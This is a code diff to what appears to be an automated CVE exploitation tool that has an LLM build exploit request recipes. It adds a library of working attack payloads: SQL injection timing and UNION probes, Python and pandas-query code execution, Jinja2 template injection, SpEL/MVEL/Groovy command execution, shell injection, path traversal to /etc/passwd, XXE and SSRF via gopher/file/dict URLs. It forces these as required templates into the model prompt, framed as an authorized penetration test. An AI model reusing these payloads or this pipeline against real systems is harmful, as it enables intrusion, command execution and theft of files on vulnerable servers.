@@ -17377,6 +17377,206 @@ def _summarize_intel_for_exploit(cve, product, version, intel, patch_diffs, mode
         return {}
 
 
+# Per-sink-grammar payload exemplars. When the standardized brief picks a
+# sink_grammar, these REQUIRED templates get injected into the recipe
+# extractor's prompt so the LLM uses the right dialect syntax instead of
+# freewheeling raw Python / shell / whatever it defaults to. Research
+# finding on CVE-2024-3408 dtale: brief correctly tagged `pandas-query`,
+# but the LLM still emitted `1 or 1=1; __import__('os').system('id')`
+# (raw Python semicolons, not pandas-query @-prefixed name access).
+#
+# Each entry: (exemplars, signature-tokens-the-payload-must-contain).
+# `signature_tokens` is used by the mild validator at `_recipe_to_spec` to
+# flag payloads that labeled a grammar but didn't match its shape.
+_SINK_GRAMMAR_TEMPLATES = {
+    "sqli-mysql": {
+        "exemplars": [
+            "' AND SLEEP({N})-- -",
+            "' UNION SELECT 1,{CANARY},3-- -",
+            "' AND (SELECT CASE WHEN (1=1) THEN SLEEP({N}) ELSE 0 END)-- -",
+        ],
+        "signature_tokens": ["SLEEP(", "UNION SELECT", "' AND", "' OR"],
+        "notes": "MySQL: use SLEEP() (not pg_sleep). Comment with `-- ` or `#`.",
+    },
+    "sqli-postgres": {
+        "exemplars": [
+            "' OR pg_sleep({N})-- -",
+            "' AND (SELECT CASE WHEN 1=1 THEN pg_sleep({N}) ELSE NULL END)-- -",
+            "'||(SELECT pg_sleep({N}))||'",
+        ],
+        "signature_tokens": ["pg_sleep", "' OR", "' AND", "||"],
+        "notes": "PostgreSQL: use pg_sleep() (NOT MySQL SLEEP). String concat is `||` not `+`.",
+    },
+    "sqli-mssql": {
+        "exemplars": [
+            "'; WAITFOR DELAY '0:0:{N}'-- -",
+            "' OR IF(1=1, WAITFOR DELAY '0:0:{N}', NULL)-- -",
+        ],
+        "signature_tokens": ["WAITFOR", "DELAY"],
+        "notes": "MSSQL: use WAITFOR DELAY '0:0:N' for timing.",
+    },
+    "sqli-sqlite": {
+        "exemplars": [
+            "' AND randomblob(100000000)-- -",
+            "' UNION SELECT {CANARY},2,3-- -",
+        ],
+        "signature_tokens": ["randomblob", "UNION SELECT"],
+        "notes": "SQLite: no SLEEP; use randomblob(N) for timing or UNION SELECT for read.",
+    },
+    "pandas-query": {
+        "exemplars": [
+            "@__import__('os').popen('cat /tmp/secret').read()=={CANARY!r}",
+            "@__import__('urllib.request').urlopen('http://target:9091/upload', data=b'...').read()==1",
+            "True if __import__('os').system('<cmd>') else False",
+        ],
+        # Must have the @ prefix OR a bool-returning expression; NO semicolons.
+        "signature_tokens": ["@__import__", "@_"],
+        "forbidden_tokens": [";"],
+        "notes": "pandas.DataFrame.query() — use @-prefix for name access; .popen().read() to capture output; no semicolons.",
+    },
+    "jinja2": {
+        "exemplars": [
+            "{{self.__init__.__globals__['os'].popen('<cmd>').read()}}",
+            "{{''.__class__.__mro__[1].__subclasses__()[<N>].__init__.__globals__['os'].popen('cat /tmp/secret').read()}}",
+            "{{config.__class__.__init__.__globals__['os'].popen('<cmd>').read()}}",
+        ],
+        "signature_tokens": ["__class__", "__mro__", "__subclasses__", "__globals__", "popen", "{{"],
+        "notes": "Jinja2 SSTI: wrap in {{ }}; access os via __class__/__mro__/__subclasses__ or __globals__.",
+    },
+    "spel": {
+        "exemplars": [
+            "T(java.lang.Runtime).getRuntime().exec('<cmd>')",
+            "#{T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','<cmd>'})}",
+        ],
+        "signature_tokens": ["T(java.", "getRuntime", "exec("],
+        "notes": "Spring Expression Language: T(java.lang.Runtime) for RCE; wrap in #{ } when inline.",
+    },
+    "mvel": {
+        "exemplars": [
+            "Runtime.getRuntime().exec('<cmd>')",
+            "import java.lang.Runtime; Runtime.getRuntime().exec('<cmd>')",
+        ],
+        "signature_tokens": ["Runtime.getRuntime", "exec("],
+        "notes": "MVEL (Drools/Camel): Runtime.getRuntime().exec().",
+    },
+    "groovy": {
+        "exemplars": [
+            "['bash','-c','<cmd>'].execute().text",
+            "'<cmd>'.execute()",
+        ],
+        "signature_tokens": [".execute()", ".execute("],
+        "notes": "Groovy: String.execute() or List.execute() shortcuts.",
+    },
+    "python-eval": {
+        "exemplars": [
+            "__import__('os').popen('<cmd>').read()",
+            "__import__('os').system('<cmd>')",
+        ],
+        "signature_tokens": ["__import__", "popen", "system"],
+        "notes": "Direct eval() sink: __import__('os') to escape.",
+    },
+    "shell": {
+        "exemplars": [
+            "; <cmd>; #",
+            "`<cmd>`",
+            "$(<cmd>)",
+            "| <cmd>",
+        ],
+        "signature_tokens": [";", "`", "$(", "|"],
+        "notes": "Shell injection: ; or $() or backticks or pipe.",
+    },
+    "path-traversal": {
+        "exemplars": [
+            "../../../etc/passwd",
+            "..%2F..%2F..%2Fetc%2Fpasswd",
+            "../../../tmp/secret",
+            "....//....//....//etc/passwd",
+        ],
+        "signature_tokens": ["../", "..%2F", "....//"],
+        "notes": "Path traversal: ../ sequences; try URL-encoding and double-encoding.",
+    },
+    "xml-xxe": {
+        "exemplars": [
+            '<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>',
+            '<!DOCTYPE x [<!ENTITY % remote SYSTEM "{OOB_URL}">%remote;]>',
+        ],
+        "signature_tokens": ["<!DOCTYPE", "<!ENTITY", "SYSTEM"],
+        "notes": "XXE: SYSTEM entity to read file:// or trigger OOB fetch.",
+    },
+    "url": {
+        "exemplars": [
+            "{OOB_URL}",
+            "http://localhost:8000/",
+            "gopher://localhost:6379/_FLUSHALL%0d%0a",
+            "file:///etc/passwd",
+            "dict://localhost:11211/stat",
+        ],
+        "signature_tokens": ["{OOB_URL}", "localhost", "gopher://", "file://", "dict://"],
+        "notes": "SSRF: {OOB_URL} for callback, or localhost:<svc> / gopher:// / file:// / dict:// for internal.",
+    },
+}
+
+
+def _format_sink_grammar_guidance(sink_grammar):
+    """Return a prompt block with REQUIRED exemplars for the chosen grammar.
+    Fed into the recipe extractor so the LLM uses the right syntax instead
+    of freewheeling. Returns "" when grammar is unknown/missing."""
+    if not sink_grammar or sink_grammar == "unknown":
+        return ""
+    g = _SINK_GRAMMAR_TEMPLATES.get(sink_grammar.lower())
+    if not g:
+        return ""
+    lines = [
+        "",
+        f"=== REQUIRED PAYLOAD GRAMMAR: {sink_grammar} ===",
+        f"NOTES: {g['notes']}",
+        "Your `payload_template` MUST follow one of these shapes (adapt {N} / {CANARY} / <cmd>):",
+    ]
+    for ex in g["exemplars"]:
+        lines.append(f"  * {ex}")
+    lines.append(
+        "DO NOT emit raw Python semicolons, bare shell commands, or other "
+        "dialects when this grammar is set — the sink will not execute them. "
+        "Research finding on CVE-2024-3408: brief tagged pandas-query but LLM "
+        "emitted `1 or 1=1; __import__('os').system('id')` — the semicolon was "
+        "a dead giveaway. Match the dialect."
+    )
+    lines.append("=== END GRAMMAR ===")
+    lines.append("")
+    return "\n".join(lines)
+
+
+def _validate_payload_matches_grammar(payload_template, sink_grammar):
+    """Return (ok, hint). When the brief declared a sink_grammar but the
+    payload template doesn't match its shape, flag it. Checks TWO things:
+    (1) must contain at least one `signature_token` (positive signal)
+    (2) must NOT contain any `forbidden_token` (negative signal — e.g. a
+        semicolon in a pandas-query payload is a dead giveaway it's raw Python)
+    Soft validator — _recipe_to_spec adds a note; the loop keeps going (an
+    aggressive reject would risk false positives on new patterns)."""
+    if not payload_template or not sink_grammar or sink_grammar == "unknown":
+        return True, ""
+    g = _SINK_GRAMMAR_TEMPLATES.get(sink_grammar.lower())
+    if not g:
+        return True, ""
+    sigs = g.get("signature_tokens") or []
+    forbidden = g.get("forbidden_tokens") or []
+    low = payload_template.lower()
+    # Check forbidden tokens FIRST — if present, it's wrong even when a
+    # signature token is also present (e.g. `__import__` in `; __import__()`
+    # is Python not pandas-query).
+    for f in forbidden:
+        if f.lower() in low:
+            return False, (f"payload labeled sink_grammar={sink_grammar} but contains "
+                           f"forbidden token {f!r} — likely wrong dialect "
+                           f"(e.g. semicolons in pandas-query = raw Python, not pandas)")
+    for s in sigs:
+        if s.lower() in low:
+            return True, ""
+    return False, (f"payload labeled sink_grammar={sink_grammar} but contains "
+                   f"no signature token from {sigs[:4]} — likely wrong dialect")
+
+
 def _format_intel_summary_for_prompt(summary):
     """Render the standardized brief as a focused text block for the recipe
     extractor's prompt. Keeps the shape stable even when fields are empty."""
@@ -17497,6 +17697,14 @@ def _llm_extract_exploit_recipe(cve, product, version, intel, patch_diffs, model
             f"{escalation}"
         )
     brief_section = _format_intel_summary_for_prompt(intel_summary) if intel_summary else ""
+    # Grammar guidance: when the brief picked a sink_grammar, inject the
+    # per-grammar REQUIRED payload exemplars + notes so the LLM uses the right
+    # dialect syntax (dialect label alone wasn't enough — see
+    # Docs/CVE_RESEARCH_COMPARISON.md's dtale finding).
+    _grammar = None
+    if intel_summary and isinstance(intel_summary, dict):
+        _grammar = ((intel_summary.get("payload") or {}).get("sink_grammar") or "").strip()
+    grammar_section = _format_sink_grammar_guidance(_grammar)
     prompt = (
         f"You are a security engineer on an AUTHORIZED penetration test documenting "
         f"{cve} ({product or '?'} {version or ''}) so the tester can validate it. "
@@ -17504,6 +17712,7 @@ def _llm_extract_exploit_recipe(cve, product, version, intel, patch_diffs, model
         f"where the removed lines are the vulnerable code), extract a STRUCTURED "
         f"request RECIPE that will trigger the weakness. Output JSON ONLY, no prose.\n\n"
         f"{brief_section}"
+        f"{grammar_section}"
         f"REFERENCE:\n{(intel.get('combined') or '')[:14000]}\n"
         f"{patch_section}{hints_section}\n\n"
         f'Required JSON shape: {{"vuln_class": "sqli|rce|lfi|ssrf|xxe|ssti|idor", '
@@ -17722,6 +17931,22 @@ def _recipe_to_spec(cve, product, recipe):
             else:
                 # append or wrap depending on shape
                 spec["injection"]["payload_template"] = pt + " {OOB_URL}" if pt else "{OOB_URL}"
+    # Grammar/payload mismatch validator: when the recipe declared a sink_grammar
+    # but the payload template contains none of that grammar's signature tokens,
+    # tag a note so the operator (and refine loop) see the mismatch. Soft check
+    # — doesn't rewrite the payload (dialects evolve; false positives are
+    # possible). Research finding on CVE-2024-3408: brief tagged pandas-query
+    # but LLM emitted `1 or 1=1; __import__('os').system('id')` (raw Python
+    # semicolons). This flag would have caught the mismatch and the escalation
+    # path could pick up on it.
+    _sg = (recipe.get("sink_grammar")
+           or (recipe.get("payload") or {}).get("sink_grammar"))
+    _pt_check = (spec.get("injection") or {}).get("payload_template", "")
+    ok, hint = _validate_payload_matches_grammar(_pt_check, _sg)
+    if not ok:
+        spec["notes"] = (spec.get("notes") or "") + f" [grammar-mismatch: {hint}]"
+        # Also surface in refine_hints-style metadata so the next pass sees it
+        spec["_grammar_mismatch"] = {"grammar": _sg, "hint": hint}
     return spec
 
 
